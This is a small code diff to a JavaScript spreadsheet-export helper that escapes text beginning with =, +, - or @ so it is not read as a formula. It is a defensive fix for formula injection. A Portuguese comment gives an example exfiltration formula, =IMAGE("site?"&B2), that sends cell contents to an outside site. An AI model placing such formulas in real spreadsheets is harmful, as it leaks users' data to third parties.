@@ -112,7 +112,9 @@ function valor(v, tipo) {
   if (tipo === 'date') { var p = String(v).slice(0, 10).split('-'); return new Date(+p[0], +p[1] - 1, +p[2]); }
   if (tipo === 'numeric') return Number(v);
   if (tipo === 'boolean') return v ? 'sim' : 'não';
-  return String(v);
+  var t = String(v);
+  /* texto que começa com = + - @ viraria fórmula na planilha (dá para vazar dados com =IMAGE("site?"&B2)): vai como texto */
+  return /^[=+\-@]/.test(t) ? "'" + t : t;
 }
 
 function formato(c) {
